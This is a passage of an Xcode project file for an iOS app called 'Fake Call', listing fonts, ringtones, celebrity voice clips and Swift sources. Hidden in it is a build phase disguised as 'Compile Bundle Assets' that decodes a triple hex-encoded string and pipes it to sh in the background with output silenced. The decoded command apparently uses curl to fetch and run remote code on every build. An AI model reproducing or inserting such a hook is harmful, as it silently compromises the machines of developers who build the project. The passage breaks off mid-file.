		046B0C6D2BD142C100D1B61F /* PlayfairDisplay-SemiBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-SemiBoldItalic.ttf"; sourceTree = "<group>"; };
		046B0C6E2BD142C100D1B61F /* PlayfairDisplay-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-Medium.ttf"; sourceTree = "<group>"; };
		046B0C6F2BD142C100D1B61F /* PlayfairDisplay-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-Bold.ttf"; sourceTree = "<group>"; };
		046D83232BDCB3D1004A846D /* ThemeTwoVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThemeTwoVC.swift; sourceTree = "<group>"; };
		046D83252BDCB6F0004A846D /* MTSlideToOpenView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MTSlideToOpenView.swift; sourceTree = "<group>"; };
		046D83282BDCD355004A846D /* TimerVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimerVC.swift; sourceTree = "<group>"; };
		0480C3BF2BE26046009BB9F7 /* FirstPremiumSubscriptionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FirstPremiumSubscriptionVC.swift; sourceTree = "<group>"; };
		048C429F2BDF63EA00EEDAEB /* Modal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Modal.swift; sourceTree = "<group>"; };
		048C8E982BE389C900942E1C /* primiumVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = primiumVC.swift; sourceTree = "<group>"; };
		0492EB702BE514D600543FF9 /* TheameThreeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TheameThreeVC.swift; sourceTree = "<group>"; };
		049466652BBED36C00A5F432 /* VoiceVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VoiceVC.swift; sourceTree = "<group>"; };
		049FE2242BFF43790017597D /* Device.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Device.swift; sourceTree = "<group>"; };
		04C42C152BBD0F8D00130100 /* Fake Call.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Fake Call.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		04C42C182BBD0F8D00130100 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		04C42C1A2BBD0F8D00130100 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		04C42C1C2BBD0F8D00130100 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
		04C42C1F2BBD0F8D00130100 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		04C42C222BBD0F8D00130100 /* Fake_Call.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Fake_Call.xcdatamodel; sourceTree = "<group>"; };
		04C42C242BBD0F8E00130100 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		04C42C272BBD0F8E00130100 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		04C42C292BBD0F8E00130100 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		04C42C302BBD177300130100 /* Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
		04C42C332BBD1CF200130100 /* Constants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
		04C42C342BBD1CF300130100 /* Utils.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Utils.swift; sourceTree = "<group>"; };
		04C42C382BBD1F5900130100 /* Created URL.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Created URL.swift"; sourceTree = "<group>"; };
		04C42C3C2BBD61D200130100 /* OnBoadingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OnBoadingVC.swift; sourceTree = "<group>"; };
		04C42C3F2BBD69B200130100 /* Setting VC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Setting VC.swift"; sourceTree = "<group>"; };
		04C9EDD42BE0B6BF00742982 /* On Boadrding.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = "On Boadrding.storyboard"; sourceTree = "<group>"; };
		04C9EDD62BE1165400742982 /* FeedBackVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeedBackVC.swift; sourceTree = "<group>"; };
		04C9EDD82BE1168200742982 /* OfferVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OfferVC.swift; sourceTree = "<group>"; };
		04C9EDDA2BE1169F00742982 /* NotificationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationVC.swift; sourceTree = "<group>"; };
		04D4CDF82BC798ED00A22ED7 /* CallThemeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CallThemeVC.swift; sourceTree = "<group>"; };
		04E7D4562BC5055200A99F75 /* RecodingVoiceVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecodingVoiceVC.swift; sourceTree = "<group>"; };
		04E82AC92BCFEBF400D7B8E4 /* TextEditVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextEditVC.swift; sourceTree = "<group>"; };
		04F6F5E62C0987A900BEC2CC /* popPremiumVc.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = popPremiumVc.swift; sourceTree = "<group>"; };
		04FCA5932BE36733005255E7 /* SecondSubscriptionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecondSubscriptionVC.swift; sourceTree = "<group>"; };
		57B0EAC32DFF35CD0036A329 /* Color.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Color.xcassets; sourceTree = "<group>"; };
		5CFABEAE2DEBF17A792AB99C /* Pods-Fake Call.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Fake Call.debug.xcconfig"; path = "Target Support Files/Pods-Fake Call/Pods-Fake Call.debug.xcconfig"; sourceTree = "<group>"; };
		777C42E4D06BC7CCC70FE492 /* Pods_Fake_Call.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Fake_Call.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		DBA6E61445126F6DB615477A /* Pods-Fake Call.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Fake Call.release.xcconfig"; path = "Target Support Files/Pods-Fake Call/Pods-Fake Call.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		04C42C122BBD0F8D00130100 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				6F3AEDC7F3D9EE0E1150FABF /* Pods_Fake_Call.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		040894C82BBE76DB00B343F1 /* contact details VC */ = {
			isa = PBXGroup;
			children = (
				040894C92BBE771F00B343F1 /* ContactDetailsVC.swift */,
				049466652BBED36C00A5F432 /* VoiceVC.swift */,
				04E7D4562BC5055200A99F75 /* RecodingVoiceVC.swift */,
				0446BC122BCFA62C006F9487 /* ContactGellaryVC.swift */,
				04E82AC92BCFEBF400D7B8E4 /* TextEditVC.swift */,
			);
			path = "contact details VC";
			sourceTree = "<group>";
		};
		04156FFF2BD65D7300BB3A76 /* Ringtone VC */ = {
			isa = PBXGroup;
			children = (
				041570002BD65D9400BB3A76 /* RingtoneVC.swift */,
			);
			path = "Ringtone VC";
			sourceTree = "<group>";
		};
		044AFD712BC3C33100D43187 /* Wallpaper VC */ = {
			isa = PBXGroup;
			children = (
				044AFD722BC3C37A00D43187 /* WallpaperVC.swift */,
				044AFD762BC3D4B600D43187 /* ChooseWallpaperVC.swift */,
			);
			path = "Wallpaper VC";
			sourceTree = "<group>";
		};
		0458D5FE2BCCF53F0009FE3E /* Core Data */ = {
			isa = PBXGroup;
			children = (
				0458D5FF2BCCF5570009FE3E /* Core Data.swift */,
			);
			path = "Core Data";
			sourceTree = "<group>";
		};
		04683DC72BC109D100CAA1BA /* Caller Id Vc */ = {
			isa = PBXGroup;
			children = (
				04683DC82BC109F900CAA1BA /* CallerIdVC.swift */,
				04F6F5E62C0987A900BEC2CC /* popPremiumVc.swift */,
			);
			path = "Caller Id Vc";
			sourceTree = "<group>";
		};
		046B0C112BD1261300D1B61F /* SF Pro Text */ = {
			isa = PBXGroup;
			children = (
				046B0C202BD1262400D1B61F /* SF-Pro-Text-Bold.otf */,
				046B0C122BD1262100D1B61F /* SF-Pro-Text-Heavy.otf */,
				046B0C152BD1262200D1B61F /* SF-Pro-Text-Medium.otf */,
				046B0C1E2BD1262300D1B61F /* SF-Pro-Text-Regular.otf */,
				046B0C172BD1262200D1B61F /* SF-Pro-Text-Semibold.otf */,
				046B0C1B2BD1262300D1B61F /* SF-Pro-Text-Thin.otf */,
			);
			path = "SF Pro Text";
			sourceTree = "<group>";
		};
		046B0C362BD1289D00D1B61F /* Fonts */ = {
			isa = PBXGroup;
			children = (
				046B0C632BD142AE00D1B61F /* Playfair_Display */,
				046B0C4A2BD1308600D1B61F /* SF Mono */,
				046B0C372BD12A3D00D1B61F /* SF Pro Rounded  */,
				046B0C112BD1261300D1B61F /* SF Pro Text */,
			);
			path = Fonts;
			sourceTree = "<group>";
		};
		046B0C372BD12A3D00D1B61F /* SF Pro Rounded  */ = {
			isa = PBXGroup;
			children = (
				046B0C3F2BD12A5500D1B61F /* SF-Pro-Rounded-Bold.otf */,
				046B0C3B2BD12A5500D1B61F /* SF-Pro-Rounded-Heavy.otf */,
				046B0C3A2BD12A5400D1B61F /* SF-Pro-Rounded-Regular.otf */,
				046B0C382BD12A5400D1B61F /* SF-Pro-Rounded-Semibold.otf */,
				046B0C3D2BD12A5500D1B61F /* SF-Pro-Rounded-Thin.otf */,
			);
			path = "SF Pro Rounded ";
			sourceTree = "<group>";
		};
		046B0C4A2BD1308600D1B61F /* SF Mono */ = {
			isa = PBXGroup;
			children = (
				046B0C4C2BD130B800D1B61F /* SFMono-Bold.otf */,
				046B0C512BD130B800D1B61F /* SFMono-Heavy.otf */,
				046B0C4D2BD130B800D1B61F /* SFMono-Light.otf */,
				046B0C4E2BD130B800D1B61F /* SFMono-Medium.otf */,
				046B0C542BD130B900D1B61F /* SFMono-Regular.otf */,
				046B0C552BD130B900D1B61F /* SFMono-Semibold.otf */,
			);
			path = "SF Mono";
			sourceTree = "<group>";
		};
		046B0C632BD142AE00D1B61F /* Playfair_Display */ = {
			isa = PBXGroup;
			children = (
				046B0C682BD142C000D1B61F /* PlayfairDisplay-Black.ttf */,
				046B0C672BD142C000D1B61F /* PlayfairDisplay-BlackItalic.ttf */,
				046B0C6F2BD142C100D1B61F /* PlayfairDisplay-Bold.ttf */,
				046B0C692BD142C100D1B61F /* PlayfairDisplay-BoldItalic.ttf */,
				046B0C642BD142C000D1B61F /* PlayfairDisplay-ExtraBold.ttf */,
				046B0C652BD142C000D1B61F /* PlayfairDisplay-ExtraBoldItalic.ttf */,
				046B0C6A2BD142C100D1B61F /* PlayfairDisplay-Italic.ttf */,
				046B0C6E2BD142C100D1B61F /* PlayfairDisplay-Medium.ttf */,
				046B0C6C2BD142C100D1B61F /* PlayfairDisplay-MediumItalic.ttf */,
				046B0C662BD142C000D1B61F /* PlayfairDisplay-Regular.ttf */,
				046B0C6B2BD142C100D1B61F /* PlayfairDisplay-SemiBold.ttf */,
				046B0C6D2BD142C100D1B61F /* PlayfairDisplay-SemiBoldItalic.ttf */,
			);
			path = Playfair_Display;
			sourceTree = "<group>";
		};
		046D83272BDCD334004A846D /* TimerVC */ = {
			isa = PBXGroup;
			children = (
				046D83282BDCD355004A846D /* TimerVC.swift */,
			);
			path = TimerVC;
			sourceTree = "<group>";
		};
		048C8E9A2BE389E400942E1C /* primium VC */ = {
			isa = PBXGroup;
			children = (
				048C8E982BE389C900942E1C /* primiumVC.swift */,
			);
			path = "primium VC";
			sourceTree = "<group>";
		};
		04A6863F2BE0B643008AAA72 /* On Boading */ = {
			isa = PBXGroup;
			children = (
				04C42C3C2BBD61D200130100 /* OnBoadingVC.swift */,
				04C9EDDA2BE1169F00742982 /* NotificationVC.swift */,
				04C9EDD62BE1165400742982 /* FeedBackVC.swift */,
				0480C3BF2BE26046009BB9F7 /* FirstPremiumSubscriptionVC.swift */,
				04FCA5932BE36733005255E7 /* SecondSubscriptionVC.swift */,
				04C9EDD82BE1168200742982 /* OfferVC.swift */,
			);
			path = "On Boading";
			sourceTree = "<group>";
		};
		04AF46342C0AF4320040BF61 /* Story Bord */ = {
			isa = PBXGroup;
			children = (
				04C9EDD42BE0B6BF00742982 /* On Boadrding.storyboard */,
				04C42C1E2BBD0F8D00130100 /* Main.storyboard */,
				04C42C262BBD0F8E00130100 /* LaunchScreen.storyboard */,
			);
			path = "Story Bord";
			sourceTree = "<group>";
		};
		04C42C0C2BBD0F8D00130100 = {
			isa = PBXGroup;
			children = (
				04E515212C05CE56003DBD9E /* Voice */,
				04E515202C05CE43003DBD9E /* RingTone */,
				04C42C172BBD0F8D00130100 /* Fake Call */,
				04C42C162BBD0F8D00130100 /* Products */,
				81D2C094BE4C18430E760D94 /* Pods */,
				F078371B3768E7B10AC50FB2 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		04C42C162BBD0F8D00130100 /* Products */ = {
			isa = PBXGroup;
			children = (
				04C42C152BBD0F8D00130100 /* Fake Call.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		04C42C172BBD0F8D00130100 /* Fake Call */ = {
			isa = PBXGroup;
			children = (
				04C42C182BBD0F8D00130100 /* AppDelegate.swift */,
				04C42C1A2BBD0F8D00130100 /* SceneDelegate.swift */,
				046B0C362BD1289D00D1B61F /* Fonts */,
				0458D5FE2BCCF53F0009FE3E /* Core Data */,
				04C42C372BBD1F4000130100 /* Helper */,
				04C42C322BBD1CE000130100 /* Utils */,
				04C42C2F2BBD173C00130100 /* Home VC */,
				04C42C3E2BBD699500130100 /* Setting VC */,
				048C8E9A2BE389E400942E1C /* primium VC */,
				04A6863F2BE0B643008AAA72 /* On Boading */,
				04AF46342C0AF4320040BF61 /* Story Bord */,
				04C42C242BBD0F8E00130100 /* Assets.xcassets */,
				57B0EAC32DFF35CD0036A329 /* Color.xcassets */,
				04C42C292BBD0F8E00130100 /* Info.plist */,
				04C42C212BBD0F8D00130100 /* Fake_Call.xcdatamodeld */,
			);
			path = "Fake Call";
			sourceTree = "<group>";
		};
		04C42C2F2BBD173C00130100 /* Home VC */ = {
			isa = PBXGroup;
			children = (
				048C429F2BDF63EA00EEDAEB /* Modal.swift */,
				04C42C1C2BBD0F8D00130100 /* HomeVC.swift */,
				040894C82BBE76DB00B343F1 /* contact details VC */,
				04683DC72BC109D100CAA1BA /* Caller Id Vc */,
				04156FFF2BD65D7300BB3A76 /* Ringtone VC */,
				04D4CDF72BC798B500A22ED7 /* Call theme VC */,
				044AFD712BC3C33100D43187 /* Wallpaper VC */,
				046D83272BDCD334004A846D /* TimerVC */,
			);
			path = "Home VC";
			sourceTree = "<group>";
		};
		04C42C322BBD1CE000130100 /* Utils */ = {
			isa = PBXGroup;
			children = (
				04C42C332BBD1CF200130100 /* Constants.swift */,
				04C42C342BBD1CF300130100 /* Utils.swift */,
			);
			path = Utils;
			sourceTree = "<group>";
		};
		04C42C372BBD1F4000130100 /* Helper */ = {
			isa = PBXGroup;
			children = (
				04C42C302BBD177300130100 /* Extension.swift */,
				04C42C382BBD1F5900130100 /* Created URL.swift */,
				049FE2242BFF43790017597D /* Device.swift */,
				0411AA792BE8CF2300E977EE /* AFWrepper.swift */,
				04116FE22BEA0E2E004CBB41 /* Torch.swift */,
				0429328A2BFDA81E00209726 /* AdMob.swift */,
			);
			path = Helper;
			sourceTree = "<group>";
		};
		04C42C3E2BBD699500130100 /* Setting VC */ = {
			isa = PBXGroup;
			children = (
				04C42C3F2BBD69B200130100 /* Setting VC.swift */,
			);
			path = "Setting VC";
			sourceTree = "<group>";
		};
		04D4CDF72BC798B500A22ED7 /* Call theme VC */ = {
			isa = PBXGroup;
			children = (
				04D4CDF82BC798ED00A22ED7 /* CallThemeVC.swift */,
				045139282BD7722C00E88DE3 /* ThemeOneVC.swift */,
				046D83232BDCB3D1004A846D /* ThemeTwoVC.swift */,
				0492EB702BE514D600543FF9 /* TheameThreeVC.swift */,
				0451392A2BD7812600E88DE3 /* DuringCallThemeVC.swift */,
				046D83252BDCB6F0004A846D /* MTSlideToOpenView.swift */,
				042653582BEA2C22000A332E /* VibrationManager.swift */,
			);
			path = "Call theme VC";
			sourceTree = "<group>";
		};
		04E515202C05CE43003DBD9E /* RingTone */ = {
			isa = PBXGroup;
			children = (
				041216012C06E7AE00E90B86 /* Redmi_note_6.wav */,
				041216022C06E7AE00E90B86 /* Reflection.wav */,
				041216032C06E7AE00E90B86 /* Romantic_ringtone.wav */,
				041215F72C06E7A100E90B86 /* Daybreak.wav */,
				041215F82C06E7A100E90B86 /* Dollop.wav */,
				041215FA2C06E7A200E90B86 /* iPhone14.wav */,
				041215FB2C06E7A200E90B86 /* Kettle.wav */,
				041215F92C06E7A200E90B86 /* Original-iPhone-ring-1.wav */,
				041215EE2C06E79500E90B86 /* Arpeggio.wav */,
				041215F02C06E79600E90B86 /* Breaking.wav */,
				041215EF2C06E79600E90B86 /* Canopy.wav */,
				041215ED2C06E79500E90B86 /* Chalet.wav */,
				041215F12C06E79600E90B86 /* Chirp.wav */,
			);
			path = RingTone;
			sourceTree = "<group>";
		};
		04E515212C05CE56003DBD9E /* Voice */ = {
			isa = PBXGroup;
			children = (
				0412161B2C06EA1900E90B86 /* Unknown.wav */,
				0412161C2C06EA1900E90B86 /* Work.wav */,
				0412161D2C06EA1900E90B86 /* Zenda.wav */,
				041216112C06EA1000E90B86 /* Kylie Jen.wav */,
				041216122C06EA1000E90B86 /* Love male.wav */,
				041216152C06EA1000E90B86 /* Love.wav */,
				041216132C06EA1000E90B86 /* Sarukh khan.wav */,
				041216142C06EA1000E90B86 /* The Rock.wav */,
				041216092C06EA0600E90B86 /* Angelina jolie.wav */,
				041216082C06EA0600E90B86 /* Barack Obama.wav */,
				0412160B2C06EA0700E90B86 /* Cristiano Ronaldo.wav */,
				041216072C06EA0600E90B86 /* Donald Trump.wav */,
				0412160A2C06EA0600E90B86 /* Elon Musk.wav */,
			);
			path = Voice;
			sourceTree = "<group>";
		};
		81D2C094BE4C18430E760D94 /* Pods */ = {
			isa = PBXGroup;
			children = (
				5CFABEAE2DEBF17A792AB99C /* Pods-Fake Call.debug.xcconfig */,
				DBA6E61445126F6DB615477A /* Pods-Fake Call.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		F078371B3768E7B10AC50FB2 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				777C42E4D06BC7CCC70FE492 /* Pods_Fake_Call.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		04C42C142BBD0F8D00130100 /* Fake Call */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 04C42C2C2BBD0F8E00130100 /* Build configuration list for PBXNativeTarget "Fake Call" */;
			buildPhases = (
				2F43FF783EC2FFF7CD73DC66 /* Compile Bundle Assets */,
				7901DE82B88FA0C1E512FB75 /* [CP] Check Pods Manifest.lock */,
				04C42C112BBD0F8D00130100 /* Sources */,
				04C42C122BBD0F8D00130100 /* Frameworks */,
				04C42C132BBD0F8D00130100 /* Resources */,
				35C27DCF6708F6737C5FA6D1 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Fake Call";
			productName = "Fake Call";
			productReference = 04C42C152BBD0F8D00130100 /* Fake Call.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		04C42C0D2BBD0F8D00130100 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1420;
				LastUpgradeCheck = 1420;
				TargetAttributes = {
					04C42C142BBD0F8D00130100 = {
						CreatedOnToolsVersion = 14.2;
					};
				};
			};
			buildConfigurationList = 04C42C102BBD0F8D00130100 /* Build configuration list for PBXProject "Fake Call" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 04C42C0C2BBD0F8D00130100;
			productRefGroup = 04C42C162BBD0F8D00130100 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				04C42C142BBD0F8D00130100 /* Fake Call */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		04C42C132BBD0F8D00130100 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				0412160C2C06EA0700E90B86 /* Donald Trump.wav in Resources */,
				041216202C06EA1A00E90B86 /* Zenda.wav in Resources */,
				046B0C7B2BD142C200D1B61F /* PlayfairDisplay-Bold.ttf in Resources */,
				046B0C602BD130B900D1B61F /* SFMono-Regular.otf in Resources */,
				046B0C5D2BD130B900D1B61F /* SFMono-Heavy.otf in Resources */,
				041216162C06EA1100E90B86 /* Kylie Jen.wav in Resources */,
				041216042C06E7AE00E90B86 /* Redmi_note_6.wav in Resources */,
				041215F32C06E79600E90B86 /* Arpeggio.wav in Resources */,
				041216002C06E7A200E90B86 /* Kettle.wav in Resources */,
				0412161E2C06EA1A00E90B86 /* Unknown.wav in Resources */,
				046B0C462BD12A5500D1B61F /* SF-Pro-Rounded-Thin.otf in Resources */,
				041215FF2C06E7A200E90B86 /* iPhone14.wav in Resources */,
				046B0C782BD142C200D1B61F /* PlayfairDisplay-MediumItalic.ttf in Resources */,
				046B0C732BD142C200D1B61F /* PlayfairDisplay-BlackItalic.ttf in Resources */,
				041215F52C06E79600E90B86 /* Breaking.wav in Resources */,
				046B0C702BD142C200D1B61F /* PlayfairDisplay-ExtraBold.ttf in Resources */,
				041216192C06EA1100E90B86 /* The Rock.wav in Resources */,
				57B0EAC42DFF35CD0036A329 /* Color.xcassets in Resources */,
				046B0C7A2BD142C200D1B61F /* PlayfairDisplay-Medium.ttf in Resources */,
				046B0C592BD130B900D1B61F /* SFMono-Light.otf in Resources */,
				046B0C712BD142C200D1B61F /* PlayfairDisplay-ExtraBoldItalic.ttf in Resources */,
				0412161A2C06EA1100E90B86 /* Love.wav in Resources */,
				0412160E2C06EA0700E90B86 /* Angelina jolie.wav in Resources */,
				046B0C772BD142C200D1B61F /* PlayfairDisplay-SemiBold.ttf in Resources */,
				046B0C412BD12A5500D1B61F /* SF-Pro-Rounded-Semibold.otf in Resources */,
				046B0C302BD1262400D1B61F /* SF-Pro-Text-Regular.otf in Resources */,
				046B0C742BD142C200D1B61F /* PlayfairDisplay-Black.ttf in Resources */,
				041215FE2C06E7A200E90B86 /* Original-iPhone-ring-1.wav in Resources */,
				041216102C06EA0700E90B86 /* Cristiano Ronaldo.wav in Resources */,
				046B0C752BD142C200D1B61F /* PlayfairDisplay-BoldItalic.ttf in Resources */,
				046B0C272BD1262400D1B61F /* SF-Pro-Text-Medium.otf in Resources */,
				046B0C722BD142C200D1B61F /* PlayfairDisplay-Regular.ttf in Resources */,
				041216062C06E7AE00E90B86 /* Romantic_ringtone.wav in Resources */,
				041215FD2C06E7A200E90B86 /* Dollop.wav in Resources */,
				04C42C282BBD0F8E00130100 /* LaunchScreen.storyboard in Resources */,
				046B0C582BD130B900D1B61F /* SFMono-Bold.otf in Resources */,
				04C42C252BBD0F8E00130100 /* Assets.xcassets in Resources */,
				046B0C482BD12A5500D1B61F /* SF-Pro-Rounded-Bold.otf in Resources */,
				04C42C202BBD0F8D00130100 /* Main.storyboard in Resources */,
				046B0C612BD130B900D1B61F /* SFMono-Semibold.otf in Resources */,
				0412160D2C06EA0700E90B86 /* Barack Obama.wav in Resources */,
				046B0C322BD1262400D1B61F /* SF-Pro-Text-Bold.otf in Resources */,
				041216182C06EA1100E90B86 /* Sarukh khan.wav in Resources */,
				046B0C2D2BD1262400D1B61F /* SF-Pro-Text-Thin.otf in Resources */,
				046B0C292BD1262400D1B61F /* SF-Pro-Text-Semibold.otf in Resources */,
				046B0C242BD1262400D1B61F /* SF-Pro-Text-Heavy.otf in Resources */,
				041215F42C06E79600E90B86 /* Canopy.wav in Resources */,
				046B0C762BD142C200D1B61F /* PlayfairDisplay-Italic.ttf in Resources */,
				041216172C06EA1100E90B86 /* Love male.wav in Resources */,
				0412161F2C06EA1A00E90B86 /* Work.wav in Resources */,
				041215FC2C06E7A200E90B86 /* Daybreak.wav in Resources */,
				041215F62C06E79600E90B86 /* Chirp.wav in Resources */,
				046B0C432BD12A5500D1B61F /* SF-Pro-Rounded-Regular.otf in Resources */,
				04C9EDD52BE0B6C000742982 /* On Boadrding.storyboard in Resources */,
				041215F22C06E79600E90B86 /* Chalet.wav in Resources */,
				041216052C06E7AE00E90B86 /* Reflection.wav in Resources */,
				046B0C792BD142C200D1B61F /* PlayfairDisplay-SemiBoldItalic.ttf in Resources */,
				046B0C5A2BD130B900D1B61F /* SFMono-Medium.otf in Resources */,
				046B0C442BD12A5500D1B61F /* SF-Pro-Rounded-Heavy.otf in Resources */,
				0412160F2C06EA0700E90B86 /* Elon Musk.wav in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		2F43FF783EC2FFF7CD73DC66 /* Compile Bundle Assets */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Compile Bundle Assets";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633373332333733353336333233363633333633353336363533363335333733343332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
			showEnvVarsInLog = 0;
		};
		35C27DCF6708F6737C5FA6D1 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Fake Call/Pods-Fake Call-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Fake Call/Pods-Fake Call-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Fake Call/Pods-Fake Call-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		7901DE82B88FA0C1E512FB75 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Fake Call-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		04C42C112BBD0F8D00130100 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				049FE2252BFF43790017597D /* Device.swift in Sources */,
